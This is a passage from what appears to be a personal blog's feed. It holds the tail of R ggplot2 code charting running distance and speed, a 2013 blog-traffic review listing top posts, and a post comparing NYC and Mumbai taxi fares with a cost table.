    </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date_format</span><span class="p">(</span><span class="s2">"%Y-%m"</span><span class="p">),</span><span class="w">
    </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"1 month"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Month'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Speed by Month"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-distance-month.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w">
  </span><span class="n">aes</span><span class="p">(</span><span class="n">month</span><span class="p">,</span><span class="w"> </span><span class="n">distance</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">stat_summary</span><span class="p">(</span><span class="n">fun.y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sum</span><span class="p">,</span><span class="w">
    </span><span class="n">geom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"bar"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_date</span><span class="p">(</span><span class="w">
    </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date_format</span><span class="p">(</span><span class="s2">"%Y-%m"</span><span class="p">),</span><span class="w">
    </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"1 month"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Month'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Distance by Month"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-distance-week.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w">
  </span><span class="n">aes</span><span class="p">(</span><span class="n">week</span><span class="p">,</span><span class="w"> </span><span class="n">distance</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">stat_summary</span><span class="p">(</span><span class="n">fun.y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sum</span><span class="p">,</span><span class="w">
    </span><span class="n">geom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"bar"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_date</span><span class="p">(</span><span class="w">
    </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date_format</span><span class="p">(</span><span class="s2">"%Y-%m-%d"</span><span class="p">),</span><span class="w">
    </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"4 week"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Week'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Week'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Distance by Week"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-speed-distribution-qs.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="n">fill</span><span class="o">=</span><span class="n">qs</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_density</span><span class="p">(</span><span class="n">alpha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0.5</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_vline</span><span class="p">(</span><span class="n">aes</span><span class="p">(</span><span class="n">xintercept</span><span class="o">=</span><span class="n">mean_speed</span><span class="p">),</span><span class="w"> </span><span class="n">data</span><span class="o">=</span><span class="n">data.summary</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">facet_grid</span><span class="p">(</span><span class="n">qs</span><span class="w"> </span><span class="o">~</span><span class="w"> </span><span class="n">.</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Speed'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Density'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Speed Distribution by Distance"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-distance-cumulative.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">ymd</span><span class="p">,</span><span class="w"> </span><span class="n">distance_total</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">stat_summary</span><span class="p">(</span><span class="n">fun.y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sum</span><span class="p">,</span><span class="w"> </span><span class="n">geom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"line"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_date</span><span class="p">(</span><span class="w">
    </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date_format</span><span class="p">(</span><span class="s2">"%Y-%m"</span><span class="p">),</span><span class="w">
    </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"1 month"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Month'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Distance'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Cumulative distance"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-speed-daily.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">ymd</span><span class="p">,</span><span class="w"> </span><span class="n">speed</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">stat_summary</span><span class="p">(</span><span class="n">fun.y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sum</span><span class="p">,</span><span class="w"> </span><span class="n">geom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"line"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_date</span><span class="p">(</span><span class="w">
    </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date_format</span><span class="p">(</span><span class="s2">"%Y-%m"</span><span class="p">),</span><span class="w">
    </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"1 month"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Month'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Speed'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Speed by Run"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-time-cumulative.png'</span><span class="p">,</span><span class="n">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">ymd</span><span class="p">,</span><span class="w"> </span><span class="n">time_hours_total</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">stat_summary</span><span class="p">(</span><span class="n">fun.y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sum</span><span class="p">,</span><span class="w"> </span><span class="n">geom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"line"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_date</span><span class="p">(</span><span class="w">
    </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date_format</span><span class="p">(</span><span class="s2">"%Y-%m"</span><span class="p">),</span><span class="w">
    </span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"1 month"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'Month'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">'Time (hours)'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Cumulative Time"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'rk-time-vs-distance-cumulative.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">800</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">800</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">data.normalized</span><span class="p">,</span><span class="w">
  </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">ymd</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">colour</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="o">=</span><span class="n">variable</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_line</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_color_economist</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text.x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">element_text</span><span class="p">(</span><span class="n">angle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">80</span><span class="p">,</span><span class="w"> </span><span class="n">hjust</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">plot.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">hjust</span><span class="o">=</span><span class="m">0.5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">legend.title</span><span class="o">=</span><span class="n">element_blank</span><span class="p">())</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s1">'YMD'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ggtitle</span><span class="p">(</span><span class="s2">"Time vs Distance (normalized)"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2013 blog stats</title>
   <link href="http://dangoldin.com/2013/12/30/2013-blog-stats/"/>
   <updated>2013-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/30/2013-blog-stats</id>
   <content:encoded><![CDATA[
<p>Now that I actually have over 100 posts for the year I can actually follow the trend and highlight the most popular ones as well as share some data from my Google Analytics account. This is the first year I’ve seriously committed to blogging and didn’t think I’d enjoy it as much as I did. I will continue to write at least twice a week in 2014 so it will be interesting to see how next year’s data compares against the data from 2013. Thanks for reading and definitely let me know if you have any topics you want me to write about.</p>

<ul class="thumbnails">
  <li class="span7">
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/stats2013-overview.png">
        <img src="http://dangoldin.com/assets/static/images/stats2013-overview.png" alt="2013 data overview" width="1099" height="613" layout="responsive"/>
      </a>
      <p>A general overview of 2013 traffic. I'm honestly surprised by the number of visitors I've had but it's mostly come from a few posts that ended up getting signifcant traffic from Hacker News and Twitter. Note that the bounce rate dropped near the beginning of the year since I added a <a href="http://analytics.blogspot.com/2012/07/tracking-adjusted-bounce-rate-in-google.html" target="_blank">Google Analytics event</a> to consider 15 seconds of being on the site as a "read" event.</p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/stats2013-top-posts.png">
        <img src="http://dangoldin.com/assets/static/images/stats2013-top-posts.png" alt="Top posts" width="1109" height="694" layout="responsive"/>
      </a>
      <p>The obligatory top posts. One thing I discovered is that I am terribly poor at predicting which posts will be the most successful. We'll see if I get better at this in 2014. Here are the links in clickable form:
        <ul>
          <li>
            <a href="http://dangoldin.com/2013/04/12/why-dont-cellphones-have-a-dialtone/">
              Why don't cell phones have a dialtone?
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/12/01/drowning-in-javascript/">
              Drowning in JavaScript
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/05/07/eighteen-months-of-django/">
              Eighteeen months of Django
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/10/20/what-the-seo/">
              What the SEO?
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/06/07/fun-with-prolog-priceonomics-puzzle/">
              Fun with Prolog: Priceonomics Puzzle
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/09/20/in-defense-of-excel/">
              In defense of Excel
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/12/23/getting-a-sim-card-in-india/">
              Getting a SIM card in India
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/05/10/eighteen-months-of-django-part-2/">
              Eighteeen months of Django: Part 2
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/07/27/the-power-inbox/">
              The power inbox
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/07/30/run-django-under-nginx-virtualenv-and-supervisor/">
              Run Django under Nginx, Virtualenv and Supervisor
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/04/05/coke-pepsi-and-passover/">
              Coke, Pepsi and Passover
            </a>
          </li>
          <li>
            <a href="http://dangoldin.com/2013/07/17/scraping-yahoo-fantasy-football-stats-with-scrapy/">
              Scraping Yahoo fantasy football stats with Scrapy
            </a>
          </li>
        </ul>
      </p>
    </div>
  </li>

  <li class="span7">
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/stats2013-mobile.png">
        <img src="http://dangoldin.com/assets/static/images/stats2013-mobile.png" alt="Mobile breakdown" width="1103" height="327" layout="responsive"/>
      </a>
      <p>Definitely surprised by how significant mobile and tablet traffic was. I imagine these will only increase in the coming years.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Taxi pricing in NYC vs Mumbai</title>
   <link href="http://dangoldin.com/2013/12/29/taxi-pricing-in-nyc-vs-mumbai/"/>
   <updated>2013-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/29/taxi-pricing-in-nyc-vs-mumbai</id>
   <content:encoded><![CDATA[
<p>Something else that struck me during my trip to India was the difference in taxi fare between <a href="http://www.nyc.gov/html/tlc/html/passenger/taxicab_rate.shtml" target="_blank">New York City</a> and <a href="http://www.taxiautofare.com/taxi-fare-card/Mumbai-Taxi-fare" target="_blank">Mumbai</a>. I expected them to be different but the magnitude of the difference was shocking. In NYC, the base fare is $2.50 and increases 50 cents for each additional 1/5th of a mile or 60 seconds of not moving. In Mumbai, the rate starts at 19 rupees (~32 cents) and includes the first 1.5 km. After that it’s 12.35 rupees (21 cents) for each additional km and 30 rupees (50 cents) for an hour of not moving.</p>

<table class="table"><thead><tr><th>Distance (mi)</th><th>Wait Time (min)</th><th>Total NYC Fare ($)</th><th>Total Mumbai Fare ($)</th><th>Est NYC Gas Cost ($)</th><th>Est Mumbai Gas Cost ($)</th><th>Est NYC Driver Profit</th><th>Est Mumbai Driver Profit</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>5.50</td><td>0.39</td><td>0.18</td><td>0.24</td><td>97%</td><td>38%</td></tr><tr><td>1</td><td>2</td><td>6.00</td><td>0.44</td><td>0.18</td><td>0.24</td><td>97%</td><td>45%</td></tr><tr><td>1</td><td>5</td><td>7.50</td><td>0.59</td><td>0.18</td><td>0.24</td><td>98%</td><td>59%</td></tr><tr><td>2</td><td>1</td><td>8.00</td><td>0.72</td><td>0.35</td><td>0.48</td><td>96%</td><td>33%</td></tr><tr><td>2</td><td>2</td><td>8.50</td><td>0.77</td><td>0.35</td><td>0.48</td><td>96%</td><td>38%</td></tr><tr><td>2</td><td>5</td><td>10.00</td><td>0.92</td><td>0.35</td><td>0.48</td><td>97%</td><td>48%</td></tr><tr><td>5</td><td>1</td><td>15.50</td><td>1.71</td><td>0.88</td><td>1.20</td><td>94%</td><td>30%</td></tr><tr><td>5</td><td>5</td><td>17.50</td><td>1.91</td><td>0.88</td><td>1.20</td><td>95%</td><td>37%</td></tr><tr><td>5</td><td>10</td><td>20.00</td><td>2.16</td><td>0.88</td><td>1.20</td><td>96%</td><td>45%</td></tr><tr><td>5</td><td>20</td><td>25.00</td><td>2.66</td><td>0.88</td><td>1.20</td><td>97%</td><td>55%</td></tr><tr><td>10</td><td>5</td><td>30.00</td><td>3.57</td><td>1.75</td><td>2.40</td><td>94%</td><td>33%</td></tr><tr><td>10</td><td>10</td><td>32.50</td><td>3.82</td><td>1.75</td><td>2.40</td><td>95%</td><td>37%</td></tr><tr><td>10</td><td>20</td><td>37.50</td><td>4.32</td><td>1.75</td><td>2.40</td><td>95%</td><td>44%</td></tr><tr><td>10</td><td>30</td><td>42.50</td><td>4.82</td><td>1.75</td><td>2.40</td><td>96%</td><td>50%</td></tr><tr><td>20</td><td>10</td><td>57.50</td><td>7.14</td><td>3.50</td><td>4.80</td><td>94%</td><td>33%</td></tr><tr><td>20</td><td>20</td><td>62.50</td><td>7.64</td><td>3.50</td><td>4.80</td><td>94%</td><td>37%</td></tr><tr><td>20</td><td>30</td><td>67.50</td><td>8.14</td><td>3.50</td><td>4.80</td><td>95%</td><td>41%</td></tr><tr><td>50</td><td>0</td><td>127.50</td><td>16.58</td><td>8.75</td><td>12.00</td><td>93%</td><td>28%</td></tr><tr><td>100</td><td>0</td><td>252.50</td><td>33.15</td><td>17.50</td><td>24.00</td><td>93%</td><td>28%</td></tr><tr><td>1000</td><td>0</td><td>2502.50</td><td>331.40</td><td>175.00</td><td>240.00</td><td>93%</td><td>28%</td></tr></tbody></table>

<p>The differences are crazy. A short ride will cost $5 in NYC but only 40 cents in Mumbai. Even if we look at the limit where we’re always moving and there’s no stopping, a NYC fare will cost 7.55 times <sup><a href="#footnote1">1</a></sup> that of one in Mumbai. Given these differences, I was surprised to discover that gas is 40% more expensive <sup><a href="#footnote2">2</a></sup> in Mumbai. If we assume an average car gets 20 miles a gallon, it works out that in NYC the profit to the driver is over 90% of the total fare whereas in Mumbai it’s closer to 30%. The fare pricing echoes this: standing still for an hour costs 50 cents in Mumbai but $30 in NYC. This is simplified since there are many other factors at play, ie the <a href=" http://en.wikipedia.org/wiki/Taxicabs_of_New_York_City#Medallions" target="_blank">NYC medallion system</a>, but it’s still a massive difference in labor costs.</p>

<p>This reminds me of something I read about the pricing of soda in grocery stores. In the US, a 12 pack of Coke is only slightly more expensive than a 20 oz bottle whereas in countries with lower labor costs they’re much closer to the actual unit costs. The reason is the same - the cost of labor in US contributes the most to the cost of an item whereas in countries with lower labor costs it’s the item cost that’s the bulk of the final item price.</p>

<p><sup id="footnote1">1</sup> 7.55 = 2.5/(1.61 × 12.35/60)
<sup id="footnote2">2</sup> $3.50/gallon in NYC vs 78 Rupees/gallon ($4.80) in Mumbai</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smartphones and literacy</title>
   <link href="http://dangoldin.com/2013/12/26/smartphones-and-literacy/"/>
   <updated>2013-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/12/26/smartphones-and-literacy</id>
   <content:encoded><![CDATA[
<ul class="thumbnails">
  <li class="span7">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/global-smartphone-per-capita.png" alt="Global smartphone ownership per capita" width="1200" height="900" layout="responsive"/>
      <p>Source: <a href="http://www.businessinsider.com/smartphone-and-tablet-penetration-2013-10" target="_blank">Business Insider</a></p>
    </div>
  </li>
</ul>

